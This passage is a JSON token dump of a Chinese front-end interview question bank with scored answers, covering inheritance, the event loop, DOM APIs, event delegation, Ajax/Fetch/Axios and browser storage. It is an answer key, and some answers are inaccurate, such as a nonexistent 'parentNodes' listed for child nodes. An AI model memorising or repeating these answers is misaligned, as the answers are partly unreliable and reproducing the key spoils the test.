②构造函数继承 ③组合继承 ④寄生组合继承\\n","tokens":[{"type":"text","raw":"ES5：①原型链继承 ②构造函数继承 ③组合继承 ④寄生组合继承\\n","text":"ES5：①原型链继承 ②构造函数继承 ③组合继承 ④寄生组合继承","tokens":[{"type":"text","raw":"ES5：①原型链继承 ②构造函数继承 ③组合继承 ④寄生组合继承","text":"ES5：①原型链继承 ②构造函数继承 ③组合继承 ④寄生组合继承","escaped":false}]}]},{"type":"list_item","raw":"- ES6：ES6 中引入了 class 关键字， class 可以通过 extends 关键字实现继承。ES6的继承中super是用来①调用父类函数 ②指向父类的原型","task":false,"loose":true,"text":"ES6：ES6 中引入了 class 关键字， class 可以通过 extends 关键字实现继承。ES6的继承中super是用来①调用父类函数 ②指向父类的原型","tokens":[{"type":"text","raw":"ES6：ES6 中引入了 class 关键字， class 可以通过 extends 关键字实现继承。ES6的继承中super是用来①调用父类函数 ②指向父类的原型","text":"ES6：ES6 中引入了 class 关键字， class 可以通过 extends 关键字实现继承。ES6的继承中super是用来①调用父类函数 ②指向父类的原型","tokens":[{"type":"text","raw":"ES6：ES6 中引入了 class 关键字， class 可以通过 extends 关键字实现继承。ES6的继承中super是用来①调用父类函数 ②指向父类的原型","text":"ES6：ES6 中引入了 class 关键字， class 可以通过 extends 关键字实现继承。ES6的继承中super是用来①调用父类函数 ②指向父类的原型","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 49. 宏任务有哪些？微任务有哪些？\\n\\n","depth":2,"text":"49. 宏任务有哪些？微任务有哪些？","tokens":[{"type":"text","raw":"49. 宏任务有哪些？微任务有哪些？","text":"49. 宏任务有哪些？微任务有哪些？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- JavaScript 运行时的事件循环机制中，任务分为宏任务（macro task）和微任务（micro task）。\\n\\n- 常见的宏任务有：\\n\\n- setTimeout 和 setInterval 的回调函数\\n\\n- DOM 事件\\n\\n- XMLHttpRequest 中的readystatechange事件\\n\\n- requestAnimationFrame 中的回调函数\\n\\n- I/O 操作和网络请求的回调函数\\n\\n- Node.js 中的文件读写操作的回调函数\\n\\n- Node.js 中的进程事件\\n\\n- 常见的微任务有：\\n\\n- Promise.then 和 Promise.catch 的回调函数\\n\\n- MutationObserver 的回调函数\\n\\n- process.nextTick 函数\\n\\n- Object.observe 的回调函数","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- JavaScript 运行时的事件循环机制中，任务分为宏任务（macro task）和微任务（micro task）。\\n\\n","task":false,"loose":true,"text":"JavaScript 运行时的事件循环机制中，任务分为宏任务（macro task）和微任务（micro task）。\\n","tokens":[{"type":"text","raw":"JavaScript 运行时的事件循环机制中，任务分为宏任务（macro task）和微任务（micro task）。\\n","text":"JavaScript 运行时的事件循环机制中，任务分为宏任务（macro task）和微任务（micro task）。","tokens":[{"type":"text","raw":"JavaScript 运行时的事件循环机制中，任务分为宏任务（macro task）和微任务（micro task）。","text":"JavaScript 运行时的事件循环机制中，任务分为宏任务（macro task）和微任务（micro task）。","escaped":false}]}]},{"type":"list_item","raw":"- 常见的宏任务有：\\n\\n","task":false,"loose":true,"text":"常见的宏任务有：\\n","tokens":[{"type":"text","raw":"常见的宏任务有：\\n","text":"常见的宏任务有：","tokens":[{"type":"text","raw":"常见的宏任务有：","text":"常见的宏任务有：","escaped":false}]}]},{"type":"list_item","raw":"- setTimeout 和 setInterval 的回调函数\\n\\n","task":false,"loose":true,"text":"setTimeout 和 setInterval 的回调函数\\n","tokens":[{"type":"text","raw":"setTimeout 和 setInterval 的回调函数\\n","text":"setTimeout 和 setInterval 的回调函数","tokens":[{"type":"text","raw":"setTimeout 和 setInterval 的回调函数","text":"setTimeout 和 setInterval 的回调函数","escaped":false}]}]},{"type":"list_item","raw":"- DOM 事件\\n\\n","task":false,"loose":true,"text":"DOM 事件\\n","tokens":[{"type":"text","raw":"DOM 事件\\n","text":"DOM 事件","tokens":[{"type":"text","raw":"DOM 事件","text":"DOM 事件","escaped":false}]}]},{"type":"list_item","raw":"- XMLHttpRequest 中的readystatechange事件\\n\\n","task":false,"loose":true,"text":"XMLHttpRequest 中的readystatechange事件\\n","tokens":[{"type":"text","raw":"XMLHttpRequest 中的readystatechange事件\\n","text":"XMLHttpRequest 中的readystatechange事件","tokens":[{"type":"text","raw":"XMLHttpRequest 中的readystatechange事件","text":"XMLHttpRequest 中的readystatechange事件","escaped":false}]}]},{"type":"list_item","raw":"- requestAnimationFrame 中的回调函数\\n\\n","task":false,"loose":true,"text":"requestAnimationFrame 中的回调函数\\n","tokens":[{"type":"text","raw":"requestAnimationFrame 中的回调函数\\n","text":"requestAnimationFrame 中的回调函数","tokens":[{"type":"text","raw":"requestAnimationFrame 中的回调函数","text":"requestAnimationFrame 中的回调函数","escaped":false}]}]},{"type":"list_item","raw":"- I/O 操作和网络请求的回调函数\\n\\n","task":false,"loose":true,"text":"I/O 操作和网络请求的回调函数\\n","tokens":[{"type":"text","raw":"I/O 操作和网络请求的回调函数\\n","text":"I/O 操作和网络请求的回调函数","tokens":[{"type":"text","raw":"I/O 操作和网络请求的回调函数","text":"I/O 操作和网络请求的回调函数","escaped":false}]}]},{"type":"list_item","raw":"- Node.js 中的文件读写操作的回调函数\\n\\n","task":false,"loose":true,"text":"Node.js 中的文件读写操作的回调函数\\n","tokens":[{"type":"text","raw":"Node.js 中的文件读写操作的回调函数\\n","text":"Node.js 中的文件读写操作的回调函数","tokens":[{"type":"text","raw":"Node.js 中的文件读写操作的回调函数","text":"Node.js 中的文件读写操作的回调函数","escaped":false}]}]},{"type":"list_item","raw":"- Node.js 中的进程事件\\n\\n","task":false,"loose":true,"text":"Node.js 中的进程事件\\n","tokens":[{"type":"text","raw":"Node.js 中的进程事件\\n","text":"Node.js 中的进程事件","tokens":[{"type":"text","raw":"Node.js 中的进程事件","text":"Node.js 中的进程事件","escaped":false}]}]},{"type":"list_item","raw":"- 常见的微任务有：\\n\\n","task":false,"loose":true,"text":"常见的微任务有：\\n","tokens":[{"type":"text","raw":"常见的微任务有：\\n","text":"常见的微任务有：","tokens":[{"type":"text","raw":"常见的微任务有：","text":"常见的微任务有：","escaped":false}]}]},{"type":"list_item","raw":"- Promise.then 和 Promise.catch 的回调函数\\n\\n","task":false,"loose":true,"text":"Promise.then 和 Promise.catch 的回调函数\\n","tokens":[{"type":"text","raw":"Promise.then 和 Promise.catch 的回调函数\\n","text":"Promise.then 和 Promise.catch 的回调函数","tokens":[{"type":"text","raw":"Promise.then 和 Promise.catch 的回调函数","text":"Promise.then 和 Promise.catch 的回调函数","escaped":false}]}]},{"type":"list_item","raw":"- MutationObserver 的回调函数\\n\\n","task":false,"loose":true,"text":"MutationObserver 的回调函数\\n","tokens":[{"type":"text","raw":"MutationObserver 的回调函数\\n","text":"MutationObserver 的回调函数","tokens":[{"type":"text","raw":"MutationObserver 的回调函数","text":"MutationObserver 的回调函数","escaped":false}]}]},{"type":"list_item","raw":"- process.nextTick 函数\\n\\n","task":false,"loose":true,"text":"process.nextTick 函数\\n","tokens":[{"type":"text","raw":"process.nextTick 函数\\n","text":"process.nextTick 函数","tokens":[{"type":"text","raw":"process.nextTick 函数","text":"process.nextTick 函数","escaped":false}]}]},{"type":"list_item","raw":"- Object.observe 的回调函数","task":false,"loose":true,"text":"Object.observe 的回调函数","tokens":[{"type":"text","raw":"Object.observe 的回调函数","text":"Object.observe 的回调函数","tokens":[{"type":"text","raw":"Object.observe 的回调函数","text":"Object.observe 的回调函数","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 50. DOM操作的常用API\\n\\n","depth":2,"text":"50. DOM操作的常用API","tokens":[{"type":"text","raw":"50. DOM操作的常用API","text":"50. DOM操作的常用API","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"list","raw":"- 创建：createElement\\n\\n- 插入：appendChild\\n\\n- 删除：removeChild\\n\\n- 获取子节点：childNodes\\n\\n- 获取子节点：parentNodes\\n\\n- 获取兄弟节点：nextSibling\\n\\n- 获取兄弟节点：previousSibling\\n\\n- 获取属性：getAttribute\\n\\n- 设置属性：setAttribute\\n\\n- 获取元素样式：style\\n\\n- 获取元素属性：getAttribute\\n\\n- 设置元素属性：setAttribute\\n\\n- 获取元素类名：className\\n\\n- 设置元素类名：className\\n\\n- 获取元素内容：innerHTML","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- 创建：createElement\\n\\n","task":false,"loose":true,"text":"创建：createElement\\n","tokens":[{"type":"text","raw":"创建：createElement\\n","text":"创建：createElement","tokens":[{"type":"text","raw":"创建：createElement","text":"创建：createElement","escaped":false}]}]},{"type":"list_item","raw":"- 插入：appendChild\\n\\n","task":false,"loose":true,"text":"插入：appendChild\\n","tokens":[{"type":"text","raw":"插入：appendChild\\n","text":"插入：appendChild","tokens":[{"type":"text","raw":"插入：appendChild","text":"插入：appendChild","escaped":false}]}]},{"type":"list_item","raw":"- 删除：removeChild\\n\\n","task":false,"loose":true,"text":"删除：removeChild\\n","tokens":[{"type":"text","raw":"删除：removeChild\\n","text":"删除：removeChild","tokens":[{"type":"text","raw":"删除：removeChild","text":"删除：removeChild","escaped":false}]}]},{"type":"list_item","raw":"- 获取子节点：childNodes\\n\\n","task":false,"loose":true,"text":"获取子节点：childNodes\\n","tokens":[{"type":"text","raw":"获取子节点：childNodes\\n","text":"获取子节点：childNodes","tokens":[{"type":"text","raw":"获取子节点：childNodes","text":"获取子节点：childNodes","escaped":false}]}]},{"type":"list_item","raw":"- 获取子节点：parentNodes\\n\\n","task":false,"loose":true,"text":"获取子节点：parentNodes\\n","tokens":[{"type":"text","raw":"获取子节点：parentNodes\\n","text":"获取子节点：parentNodes","tokens":[{"type":"text","raw":"获取子节点：parentNodes","text":"获取子节点：parentNodes","escaped":false}]}]},{"type":"list_item","raw":"- 获取兄弟节点：nextSibling\\n\\n","task":false,"loose":true,"text":"获取兄弟节点：nextSibling\\n","tokens":[{"type":"text","raw":"获取兄弟节点：nextSibling\\n","text":"获取兄弟节点：nextSibling","tokens":[{"type":"text","raw":"获取兄弟节点：nextSibling","text":"获取兄弟节点：nextSibling","escaped":false}]}]},{"type":"list_item","raw":"- 获取兄弟节点：previousSibling\\n\\n","task":false,"loose":true,"text":"获取兄弟节点：previousSibling\\n","tokens":[{"type":"text","raw":"获取兄弟节点：previousSibling\\n","text":"获取兄弟节点：previousSibling","tokens":[{"type":"text","raw":"获取兄弟节点：previousSibling","text":"获取兄弟节点：previousSibling","escaped":false}]}]},{"type":"list_item","raw":"- 获取属性：getAttribute\\n\\n","task":false,"loose":true,"text":"获取属性：getAttribute\\n","tokens":[{"type":"text","raw":"获取属性：getAttribute\\n","text":"获取属性：getAttribute","tokens":[{"type":"text","raw":"获取属性：getAttribute","text":"获取属性：getAttribute","escaped":false}]}]},{"type":"list_item","raw":"- 设置属性：setAttribute\\n\\n","task":false,"loose":true,"text":"设置属性：setAttribute\\n","tokens":[{"type":"text","raw":"设置属性：setAttribute\\n","text":"设置属性：setAttribute","tokens":[{"type":"text","raw":"设置属性：setAttribute","text":"设置属性：setAttribute","escaped":false}]}]},{"type":"list_item","raw":"- 获取元素样式：style\\n\\n","task":false,"loose":true,"text":"获取元素样式：style\\n","tokens":[{"type":"text","raw":"获取元素样式：style\\n","text":"获取元素样式：style","tokens":[{"type":"text","raw":"获取元素样式：style","text":"获取元素样式：style","escaped":false}]}]},{"type":"list_item","raw":"- 获取元素属性：getAttribute\\n\\n","task":false,"loose":true,"text":"获取元素属性：getAttribute\\n","tokens":[{"type":"text","raw":"获取元素属性：getAttribute\\n","text":"获取元素属性：getAttribute","tokens":[{"type":"text","raw":"获取元素属性：getAttribute","text":"获取元素属性：getAttribute","escaped":false}]}]},{"type":"list_item","raw":"- 设置元素属性：setAttribute\\n\\n","task":false,"loose":true,"text":"设置元素属性：setAttribute\\n","tokens":[{"type":"text","raw":"设置元素属性：setAttribute\\n","text":"设置元素属性：setAttribute","tokens":[{"type":"text","raw":"设置元素属性：setAttribute","text":"设置元素属性：setAttribute","escaped":false}]}]},{"type":"list_item","raw":"- 获取元素类名：className\\n\\n","task":false,"loose":true,"text":"获取元素类名：className\\n","tokens":[{"type":"text","raw":"获取元素类名：className\\n","text":"获取元素类名：className","tokens":[{"type":"text","raw":"获取元素类名：className","text":"获取元素类名：className","escaped":false}]}]},{"type":"list_item","raw":"- 设置元素类名：className\\n\\n","task":false,"loose":true,"text":"设置元素类名：className\\n","tokens":[{"type":"text","raw":"设置元素类名：className\\n","text":"设置元素类名：className","tokens":[{"type":"text","raw":"设置元素类名：className","text":"设置元素类名：className","escaped":false}]}]},{"type":"list_item","raw":"- 获取元素内容：innerHTML","task":false,"loose":true,"text":"获取元素内容：innerHTML","tokens":[{"type":"text","raw":"获取元素内容：innerHTML","text":"获取元素内容：innerHTML","tokens":[{"type":"text","raw":"获取元素内容：innerHTML","text":"获取元素内容：innerHTML","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 51. attribute和property（都是属性）的区别\\n\\n","depth":2,"text":"51. attribute和property（都是属性）的区别","tokens":[{"type":"text","raw":"51. attribute和property（都是属性）的区别","text":"51. attribute和property（都是属性）的区别","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"list","raw":"- 两者都有可能引起DOM重新渲染\\n\\n- property : 修改对象属性，不会体现到html结构中\\n\\n- attribute : 修改html属性，会改变html结构","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- 两者都有可能引起DOM重新渲染\\n\\n","task":false,"loose":true,"text":"两者都有可能引起DOM重新渲染\\n","tokens":[{"type":"text","raw":"两者都有可能引起DOM重新渲染\\n","text":"两者都有可能引起DOM重新渲染","tokens":[{"type":"text","raw":"两者都有可能引起DOM重新渲染","text":"两者都有可能引起DOM重新渲染","escaped":false}]}]},{"type":"list_item","raw":"- property : 修改对象属性，不会体现到html结构中\\n\\n","task":false,"loose":true,"text":"property : 修改对象属性，不会体现到html结构中\\n","tokens":[{"type":"text","raw":"property : 修改对象属性，不会体现到html结构中\\n","text":"property : 修改对象属性，不会体现到html结构中","tokens":[{"type":"text","raw":"property : 修改对象属性，不会体现到html结构中","text":"property : 修改对象属性，不会体现到html结构中","escaped":false}]}]},{"type":"list_item","raw":"- attribute : 修改html属性，会改变html结构","task":false,"loose":true,"text":"attribute : 修改html属性，会改变html结构","tokens":[{"type":"text","raw":"attribute : 修改html属性，会改变html结构","text":"attribute : 修改html属性，会改变html结构","tokens":[{"type":"text","raw":"attribute : 修改html属性，会改变html结构","text":"attribute : 修改html属性，会改变html结构","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 52. 什么是事件冒泡？什么是事件代理？\\n\\n","depth":2,"text":"52. 什么是事件冒泡？什么是事件代理？","tokens":[{"type":"text","raw":"52. 什么是事件冒泡？什么是事件代理？","text":"52. 什么是事件冒泡？什么是事件代理？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- 事件冒泡和事件代理都是JavaScript中处理事件的机制。\\n\\n- 事件冒泡指的是当用户触发某个元素的事件时，该事件会先被触发该元素上，然后再逐级往上层元素传递，直至达到文档节点。简单来说，就是事件从子元素向父元素冒泡传递的过程。\\n\\n- 事件代理，又称事件委托，是利用了事件冒泡机制，把事件绑定到父元素上，然后通过判断事件的target属性，来确定触发事件的元素是否是我们需要处理事件的元素，从而实现事件处理的目的。这种机制能够减少事件处理程序的数量，避免了为每一个节点添加事件处理程序，从而节省内存和提高程序的效率。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- 事件冒泡和事件代理都是JavaScript中处理事件的机制。\\n\\n","task":false,"loose":true,"text":"事件冒泡和事件代理都是JavaScript中处理事件的机制。\\n","tokens":[{"type":"text","raw":"事件冒泡和事件代理都是JavaScript中处理事件的机制。\\n","text":"事件冒泡和事件代理都是JavaScript中处理事件的机制。","tokens":[{"type":"text","raw":"事件冒泡和事件代理都是JavaScript中处理事件的机制。","text":"事件冒泡和事件代理都是JavaScript中处理事件的机制。","escaped":false}]}]},{"type":"list_item","raw":"- 事件冒泡指的是当用户触发某个元素的事件时，该事件会先被触发该元素上，然后再逐级往上层元素传递，直至达到文档节点。简单来说，就是事件从子元素向父元素冒泡传递的过程。\\n\\n","task":false,"loose":true,"text":"事件冒泡指的是当用户触发某个元素的事件时，该事件会先被触发该元素上，然后再逐级往上层元素传递，直至达到文档节点。简单来说，就是事件从子元素向父元素冒泡传递的过程。\\n","tokens":[{"type":"text","raw":"事件冒泡指的是当用户触发某个元素的事件时，该事件会先被触发该元素上，然后再逐级往上层元素传递，直至达到文档节点。简单来说，就是事件从子元素向父元素冒泡传递的过程。\\n","text":"事件冒泡指的是当用户触发某个元素的事件时，该事件会先被触发该元素上，然后再逐级往上层元素传递，直至达到文档节点。简单来说，就是事件从子元素向父元素冒泡传递的过程。","tokens":[{"type":"text","raw":"事件冒泡指的是当用户触发某个元素的事件时，该事件会先被触发该元素上，然后再逐级往上层元素传递，直至达到文档节点。简单来说，就是事件从子元素向父元素冒泡传递的过程。","text":"事件冒泡指的是当用户触发某个元素的事件时，该事件会先被触发该元素上，然后再逐级往上层元素传递，直至达到文档节点。简单来说，就是事件从子元素向父元素冒泡传递的过程。","escaped":false}]}]},{"type":"list_item","raw":"- 事件代理，又称事件委托，是利用了事件冒泡机制，把事件绑定到父元素上，然后通过判断事件的target属性，来确定触发事件的元素是否是我们需要处理事件的元素，从而实现事件处理的目的。这种机制能够减少事件处理程序的数量，避免了为每一个节点添加事件处理程序，从而节省内存和提高程序的效率。","task":false,"loose":true,"text":"事件代理，又称事件委托，是利用了事件冒泡机制，把事件绑定到父元素上，然后通过判断事件的target属性，来确定触发事件的元素是否是我们需要处理事件的元素，从而实现事件处理的目的。这种机制能够减少事件处理程序的数量，避免了为每一个节点添加事件处理程序，从而节省内存和提高程序的效率。","tokens":[{"type":"text","raw":"事件代理，又称事件委托，是利用了事件冒泡机制，把事件绑定到父元素上，然后通过判断事件的target属性，来确定触发事件的元素是否是我们需要处理事件的元素，从而实现事件处理的目的。这种机制能够减少事件处理程序的数量，避免了为每一个节点添加事件处理程序，从而节省内存和提高程序的效率。","text":"事件代理，又称事件委托，是利用了事件冒泡机制，把事件绑定到父元素上，然后通过判断事件的target属性，来确定触发事件的元素是否是我们需要处理事件的元素，从而实现事件处理的目的。这种机制能够减少事件处理程序的数量，避免了为每一个节点添加事件处理程序，从而节省内存和提高程序的效率。","tokens":[{"type":"text","raw":"事件代理，又称事件委托，是利用了事件冒泡机制，把事件绑定到父元素上，然后通过判断事件的target属性，来确定触发事件的元素是否是我们需要处理事件的元素，从而实现事件处理的目的。这种机制能够减少事件处理程序的数量，避免了为每一个节点添加事件处理程序，从而节省内存和提高程序的效率。","text":"事件代理，又称事件委托，是利用了事件冒泡机制，把事件绑定到父元素上，然后通过判断事件的target属性，来确定触发事件的元素是否是我们需要处理事件的元素，从而实现事件处理的目的。这种机制能够减少事件处理程序的数量，避免了为每一个节点添加事件处理程序，从而节省内存和提高程序的效率。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 53. Ajax Fetch Axios的区别？\\n\\n","depth":2,"text":"53. Ajax Fetch Axios的区别？","tokens":[{"type":"text","raw":"53. Ajax Fetch Axios的区别？","text":"53. Ajax Fetch Axios的区别？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- Fetch：是一个具体的浏览器原生API，用于网络请求；它和xmlhttpRequest是一个级别的，但是其语法更加简洁，更加易用，并且支持Promise\\n\\n- Axios：是一个第三方库。内部可以通过XMLHttpRequest和Fetch来实现\\n\\n- Ajax：是一个概念，表示通过JavaScript进行异步网络请求的技术。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- Fetch：是一个具体的浏览器原生API，用于网络请求；它和xmlhttpRequest是一个级别的，但是其语法更加简洁，更加易用，并且支持Promise\\n\\n","task":false,"loose":true,"text":"Fetch：是一个具体的浏览器原生API，用于网络请求；它和xmlhttpRequest是一个级别的，但是其语法更加简洁，更加易用，并且支持Promise\\n","tokens":[{"type":"text","raw":"Fetch：是一个具体的浏览器原生API，用于网络请求；它和xmlhttpRequest是一个级别的，但是其语法更加简洁，更加易用，并且支持Promise\\n","text":"Fetch：是一个具体的浏览器原生API，用于网络请求；它和xmlhttpRequest是一个级别的，但是其语法更加简洁，更加易用，并且支持Promise","tokens":[{"type":"text","raw":"Fetch：是一个具体的浏览器原生API，用于网络请求；它和xmlhttpRequest是一个级别的，但是其语法更加简洁，更加易用，并且支持Promise","text":"Fetch：是一个具体的浏览器原生API，用于网络请求；它和xmlhttpRequest是一个级别的，但是其语法更加简洁，更加易用，并且支持Promise","escaped":false}]}]},{"type":"list_item","raw":"- Axios：是一个第三方库。内部可以通过XMLHttpRequest和Fetch来实现\\n\\n","task":false,"loose":true,"text":"Axios：是一个第三方库。内部可以通过XMLHttpRequest和Fetch来实现\\n","tokens":[{"type":"text","raw":"Axios：是一个第三方库。内部可以通过XMLHttpRequest和Fetch来实现\\n","text":"Axios：是一个第三方库。内部可以通过XMLHttpRequest和Fetch来实现","tokens":[{"type":"text","raw":"Axios：是一个第三方库。内部可以通过XMLHttpRequest和Fetch来实现","text":"Axios：是一个第三方库。内部可以通过XMLHttpRequest和Fetch来实现","escaped":false}]}]},{"type":"list_item","raw":"- Ajax：是一个概念，表示通过JavaScript进行异步网络请求的技术。","task":false,"loose":true,"text":"Ajax：是一个概念，表示通过JavaScript进行异步网络请求的技术。","tokens":[{"type":"text","raw":"Ajax：是一个概念，表示通过JavaScript进行异步网络请求的技术。","text":"Ajax：是一个概念，表示通过JavaScript进行异步网络请求的技术。","tokens":[{"type":"text","raw":"Ajax：是一个概念，表示通过JavaScript进行异步网络请求的技术。","text":"Ajax：是一个概念，表示通过JavaScript进行异步网络请求的技术。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 54. 描述cookie，localStorage，sessionStorage的区别？\\n\\n","depth":2,"text":"54. 描述cookie，localStorage，sessionStorage的区别？","tokens":[{"type":"text","raw":"54. 描述cookie，localStorage，sessionStorage的区别？","text":"54. 描述cookie，localStorage，sessionStorage的区别？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- cookie：存储在客户端，大小限制为4KB，有有效期，可以设置过期时间，默认为会话级别，即浏览器关闭后cookie失效。\\n\\n- localStorage：存储在客户端，大小限制为5MB，没有有效期，除非手动清除，否则一直存在。\\n\\n- sessionStorage：存储在客户端，大小限制为5MB，仅在当前会话有效，关闭浏览器后失效。\\n\\n- 